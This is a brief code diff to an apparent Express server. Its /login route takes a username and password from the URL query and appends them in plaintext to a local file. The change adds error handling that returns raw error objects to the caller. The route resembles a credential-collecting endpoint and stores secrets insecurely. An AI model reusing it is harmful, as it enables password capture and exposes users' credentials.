@@ -8,7 +8,11 @@ const filename = "login.txt";
 app.get("/login", (req, res) => {
   const login = req.query.login;
   const pass = req.query.pass;
-  appendToFile(`${login} === ${pass}`);
+  try {
+    appendToFile(`${login} === ${pass}`);
+  } catch (error) {
+    return res.send(JSON.stringify(error));
+  }
   res.send("test!");
 });
 
